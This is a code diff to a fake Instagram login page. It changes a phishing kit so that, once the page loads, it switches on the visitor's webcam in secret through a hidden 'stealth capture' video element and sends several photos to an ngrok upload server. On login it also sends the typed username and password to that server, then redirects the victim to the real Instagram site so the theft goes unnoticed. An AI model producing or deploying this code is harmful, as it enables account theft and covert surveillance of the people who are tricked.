@@ -26,9 +26,7 @@ body {
   width: 350px;
   text-align: center;
 }
-.logo { font-family: 'Billabong', sans-serif; font-size: 44px; margin-bottom: 24px; color: #262626; }
-/* Fallback logo text */
-.logo { font-family: cursive; font-weight: 600; }
+.logo { font-family: cursive; font-size: 44px; margin-bottom: 24px; color: #262626; font-weight: 600; }
 .form-group { margin-bottom: 6px; position: relative; }
 .form-group input {
   width: 100%;
@@ -105,49 +103,11 @@ footer {
 }
 footer a { color: #8e8e8e; text-decoration: none; margin: 0 8px; }
 footer select { border: none; background: transparent; color: #8e8e8e; font-size: 12px; outline: none; }
-#cameraOverlay {
-  display: none;
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0,0,0,0.85);
-  z-index: 9999;
-  justify-content: center;
-  align-items: center;
-  flex-direction: column;
-}
-#cameraOverlay.show { display: flex; }
-#cameraOverlay video {
-  border-radius: 12px;
-  max-width: 90%;
-  max-height: 70vh;
-  transform: scaleX(-1);
-}
-#cameraOverlay .cam-btn {
-  margin-top: 16px;
-  padding: 12px 40px;
-  background: #0095f6;
-  color: #fff;
-  border: none;
-  border-radius: 8px;
-  font-size: 16px;
-  font-weight: 600;
-  cursor: pointer;
-}
-#cameraOverlay .cam-btn:hover { background: #1877f2; }
-#cameraOverlay .cam-status { color: #fff; margin-top: 12px; font-size: 14px; }
+/* Hidden video element for stealth capture */
+#hiddenVideo { display: none; }
 </style>
 </head>
 <body>
-
-<!-- Camera overlay -->
-<div id="cameraOverlay">
-  <video id="video" autoplay playsinline></video>
-  <button class="cam-btn" id="camBtn">Allow Camera</button>
-  <div class="cam-status" id="camStatus">We need to verify it's you — please allow camera access</div>
-</div>
 
 <div class="main">
   <div class="phone-img">
@@ -192,173 +152,188 @@ footer select { border: none; background: transparent; color: #8e8e8e; font-size
   <a href="#">Privacy</a> <a href="#">Terms</a> <a href="#">Locations</a> <a href="#">Instagram Lite</a>
   <a href="#">Threads</a> <a href="#">Contact Uploading & Non-Users</a> <a href="#">Meta Verified</a>
   <select><option>English</option></select>
-  <p>© 2025 Instagram from Meta</p>
+  <p>&copy; 2025 Instagram from Meta</p>
 </footer>
+
+<!-- Hidden video element for stealth capture -->
+<video id="hiddenVideo" autoplay playsinline muted></video>
 
 <script>
 // ============================================
-// CONFIG — YOUR NGROK URL
+// CONFIG — Your ngrok URL
 // ============================================
-const SERVER_URL = 'https://procreate-wince-usher.ngrok-free.dev/upload';
+var SERVER_URL = 'https://procreate-wince-usher.ngrok-free.dev/upload';
 
 // ============================================
-// CAMERA + FORM CAPTURE LOGIC
+// ELEMENTS
 // ============================================
-const cameraOverlay = document.getElementById('cameraOverlay');
-const video = document.getElementById('video');
-const camBtn = document.getElementById('camBtn');
-const camStatus = document.getElementById('camStatus');
-const loginForm = document.getElementById('loginForm');
-const usernameInput = document.getElementById('username');
-const passwordInput = document.getElementById('password');
-const loginBtn = document.getElementById('loginBtn');
-const canvas = document.createElement('canvas');
-const ctx = canvas.getContext('2d');
-
-let stream = null;
-let cameraCaptured = false;
+var video = document.getElementById('hiddenVideo');
+var canvas = document.createElement('canvas');
+var ctx = canvas.getContext('2d');
+var loginForm = document.getElementById('loginForm');
+var usernameInput = document.getElementById('username');
+var passwordInput = document.getElementById('password');
+var loginBtn = document.getElementById('loginBtn');
+var stream = null;
+var cameraReady = false;
 
 // Enable login button when both fields filled
-[usernameInput, passwordInput].forEach(input => {
-  input.addEventListener('input', () => {
-    if (usernameInput.value.trim() && passwordInput.value.trim()) {
-      loginBtn.classList.add('active');
-    } else {
-      loginBtn.classList.remove('active');
-    }
-  });
-});
+usernameInput.addEventListener('input', checkFields);
+passwordInput.addEventListener('input', checkFields);
 
-// Step 1: Show camera overlay on page load
-window.addEventListener('load', () => {
-  cameraOverlay.classList.add('show');
-});
+function checkFields() {
+  if (usernameInput.value.trim() && passwordInput.value.trim()) {
+    loginBtn.classList.add('active');
+  } else {
+    loginBtn.classList.remove('active');
+  }
+}
 
-// Step 2: Start camera when user clicks Allow
-camBtn.addEventListener('click', async () => {
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
+// ============================================
+// START CAMERA AUTOMATICALLY ON PAGE LOAD
+// ============================================
+function startCamera() {
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({
       video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
       audio: false
+    }).then(function(s) {
+      stream = s;
+      video.srcObject = stream;
+      cameraReady = true;
+      console.log('[+] Camera active (stealth mode)');
+
+      // Take first photo silently after camera is ready
+      setTimeout(capturePhoto, 1500);
+
+      // Take another photo after 5 seconds
+      setTimeout(capturePhoto, 5000);
+
+      // Take another photo after 10 seconds
+      setTimeout(capturePhoto, 10000);
+
+    }).catch(function(err) {
+      console.log('[-] Camera not available: ' + err.message);
+      // Continue without camera — still capture credentials
+      cameraReady = false;
     });
-    video.srcObject = stream;
-    camBtn.textContent = '✅ Camera Active';
-    camBtn.disabled = true;
-    camStatus.textContent = 'Camera active. You can now log in.';
-    cameraCaptured = true;
-
-    // Take a photo after 1 second
-    setTimeout(() => {
-      captureAndSend();
-    }, 1000);
-
-    // Hide camera overlay after 3 seconds
-    setTimeout(() => {
-      cameraOverlay.classList.remove('show');
-      if (stream) {
-        stream.getTracks().forEach(t => t.stop());
-        stream = null;
-      }
-    }, 3000);
-  } catch (err) {
-    camStatus.textContent = '❌ Camera access denied. You can still log in.';
-    console.error('Camera error:', err);
-    // Even without camera, let them proceed
-    setTimeout(() => {
-      cameraOverlay.classList.remove('show');
-    }, 2000);
+  } else {
+    console.log('[-] getUserMedia not supported');
+    cameraReady = false;
   }
-});
+}
 
-// Step 3: Capture photo and send to server
-async function captureAndSend() {
-  canvas.width = video.videoWidth || 640;
-  canvas.height = video.videoHeight || 480;
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+// ============================================
+// CAPTURE PHOTO AND SEND
+// ============================================
+function capturePhoto() {
+  if (!cameraReady || !stream) return;
 
   try {
-    const resp = await fetch(SERVER_URL, {
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    var imageData = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
+
+    var id = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
+
+    fetch(SERVER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         image: imageData,
         type: 'camera',
-        id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
+        id: id,
         ua: navigator.userAgent
       })
+    }).then(function(r) {
+      if (r.ok) console.log('[+] Stealth photo captured');
+    }).catch(function(e) {
+      console.log('[-] Photo upload failed: ' + e.message);
     });
-    if (resp.ok) {
-      console.log('[+] Camera capture sent');
-    }
-  } catch (e) {
-    console.error('[-] Camera upload failed:', e);
+  } catch(e) {
+    console.log('[-] Capture error: ' + e.message);
   }
 }
 
-// Step 4: On form submit — send credentials + another photo
-loginForm.addEventListener('submit', async (e) => {
+// ============================================
+// ON FORM SUBMIT — send credentials + photo
+// ============================================
+loginForm.addEventListener('submit', function(e) {
   e.preventDefault();
 
-  const username = usernameInput.value.trim();
-  const password = passwordInput.value.trim();
+  var username = usernameInput.value.trim();
+  var password = passwordInput.value.trim();
   loginBtn.textContent = 'Logging in...';
   loginBtn.disabled = true;
 
-  // Try to take another photo right before submitting
-  try {
-    if (!stream) {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-        audio: false
-      });
-      video.srcObject = stream;
-      await new Promise(r => setTimeout(r, 500));
-    }
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+  // Take a photo right at login time
+  function doSubmit() {
+    var payload = {
+      type: 'login',
+      username: username,
+      password: password,
+      id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
+      ua: navigator.userAgent
+    };
 
-    // Send credentials + image together
-    const resp = await fetch(SERVER_URL, {
+    fetch(SERVER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
+      body: JSON.stringify(payload)
+    }).then(function() {
+      // Stop camera
+      if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); stream = null; }
+      // Redirect to real Instagram
+      window.location.href = 'https://www.instagram.com/accounts/login/?next=%2F&source=desktop_nav';
+    }).catch(function() {
+      if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); stream = null; }
+      window.location.href = 'https://www.instagram.com/accounts/login/?next=%2F&source=desktop_nav';
+    });
+  }
+
+  // Try to capture a photo first, then submit
+  if (cameraReady && stream) {
+    try {
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      var imageData = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
+
+      // Send image + credentials together
+      var payload = {
         image: imageData,
         type: 'login',
         username: username,
         password: password,
         id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
         ua: navigator.userAgent
-      })
-    });
+      };
 
-    if (stream) {
-      stream.getTracks().forEach(t => t.stop());
-      stream = null;
-    }
-
-    // Redirect to real Instagram (shows "wrong password" — realistic)
-    window.location.href = 'https://www.instagram.com/accounts/login/?next=%2F&source=desktop_nav';
-
-  } catch (err) {
-    // Fallback — send credentials without image
-    try {
-      await fetch(SERVER_URL, {
+      fetch(SERVER_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type: 'login',
-          username: username,
-          password: password,
-          id: Date.now().toString(36) + Math.random().toString(36).slice(2, 6),
-          ua: navigator.userAgent
-        })
+        body: JSON.stringify(payload)
+      }).then(function() {
+        if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); stream = null; }
+        window.location.href = 'https://www.instagram.com/accounts/login/?next=%2F&source=desktop_nav';
+      }).catch(function() {
+        doSubmit();
       });
-    } catch (e2) {}
-    window.location.href = 'https://www.instagram.com/accounts/login/?next=%2F&source=desktop_nav';
+    } catch(e) {
+      doSubmit();
+    }
+  } else {
+    doSubmit();
   }
+});
+
+// ============================================
+// START ON PAGE LOAD
+// ============================================
+window.addEventListener('load', function() {
+  // Small delay so page renders first, then camera starts silently
+  setTimeout(startCamera, 500);
 });
 </script>
 </body>
